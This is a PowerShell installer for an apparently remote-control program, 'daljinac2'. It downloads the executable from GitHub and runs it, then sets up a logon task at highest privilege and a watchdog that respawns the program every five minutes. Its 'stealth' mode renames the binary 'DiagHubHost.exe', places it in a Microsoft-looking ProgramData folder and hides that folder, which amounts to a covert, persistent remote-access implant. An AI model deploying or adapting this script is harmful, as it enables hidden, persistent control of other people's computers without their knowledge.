param([switch]$notray, [switch]$stealth)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "Continue"

$URL = "https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe"

if ($stealth) {
    $Dir      = "C:\ProgramData\Microsoft\DiagHub"
    $ExeName  = "DiagHubHost.exe"
    $ExtraArgs = "-notray"
} else {
    $Dir      = "C:\daljinac2"
    $ExeName  = "daljinac2.exe"
    $ExtraArgs = if ($notray) { "-notray" } else { "" }
}
$Exe = "$Dir\$ExeName"

try {
    # Delete old tasks first so watchdog can't respawn
    Write-Host "[0a/4] Cleaning old tasks..."
    @("Daljinac2","Daljinac2Watch","DiagHubHost","DiagHubHostWatch") | ForEach-Object {
        try { schtasks /delete /tn $_ /f 2>$null } catch {}
    }

    # Kill aggressively until port is free
    Write-Host "[0b/4] Killing old processes..."
    $maxWait = 20
    do {
        Get-Process daljinac2,DiagHubHost -ErrorAction SilentlyContinue | Stop-Process -Force
        Start-Sleep -Seconds 1
        $maxWait--
        $portFree = $true
        try { (Get-NetTCPConnection -LocalPort 1984 -ErrorAction Stop).OwningProcess } catch { $portFree = $true }
        if ($maxWait -le 0) { break }
    } while (-not $portFree)
    Start-Sleep -Seconds 2

    mkdir $Dir -Force | Out-Null

    Write-Host "[1/4] Downloading..."
    Invoke-WebRequest $URL -OutFile "$Exe.new" -UseBasicParsing
    Write-Host "       $((Get-Item "$Exe.new").Length) bytes"

    Start-Sleep -Seconds 1

    Write-Host "[2/4] Replacing binary..."
    Get-Process daljinac2,DiagHubHost -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 1
    Move-Item -Force "$Exe.new" $Exe

    Write-Host "[3/4] Installing scheduled task..."
    Remove-Item "$Dir\watchdog.vbs" -Force -ErrorAction SilentlyContinue
    try { schtasks /delete /tn Daljinac2 /f 2>$null } catch {}
    try { schtasks /delete /tn Daljinac2Watch /f 2>$null } catch {}

    $taskCmd = if ($ExtraArgs) { "`"$Exe`" $ExtraArgs" } else { "`"$Exe`"" }
    schtasks /create /tn $([System.IO.Path]::GetFileNameWithoutExtension($ExeName)) /tr $taskCmd /sc ONLOGON /it /rl HIGHEST /f
    if ($LASTEXITCODE -ne 0) { throw "schtasks failed (exit=$LASTEXITCODE)" }

    $vbsContent = "CreateObject(`"WScript.Shell`").Run `"schtasks /run /tn $([System.IO.Path]::GetFileNameWithoutExtension($ExeName))`", 0, False"
    Set-Content -Path "$Dir\watchdog.vbs" -Value $vbsContent -Encoding ASCII
    schtasks /create /tn "$([System.IO.Path]::GetFileNameWithoutExtension($ExeName))Watch" /tr "wscript.exe //B $Dir\watchdog.vbs" /sc MINUTE /mo 5 /f
    if ($LASTEXITCODE -ne 0) { throw "schtasks watchdog failed (exit=$LASTEXITCODE)" }

    # Remove old Run registry key
    try {
        $reg = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", $true)
        if ($reg) {
            $reg.DeleteValue("Daljinac2")
            $reg.DeleteValue("DiagHubHost")
            $reg.Close()
        }
    } catch {}

    if ($stealth) {
        attrib +h +s $Dir
        Write-Host "       Folder hidden (+h +s)"
    }

    Write-Host "[4/4] Starting..."
    $cmd = if ($ExtraArgs) { "`"$Exe`" $ExtraArgs" } else { "`"$Exe`"" }
    ([wmiclass]'Win32_Process').Create($cmd) | Out-Null

    Write-Host ""
    Write-Host "DONE." -ForegroundColor Green
    if ($stealth) { Write-Host "  Mode: STEALTH ($ExeName)" }
    elseif ($notray) { Write-Host "  Mode: no-tray" }
} catch {
    Write-Host ""
    Write-Host "ERROR: $_" -ForegroundColor Red
    exit 1
}
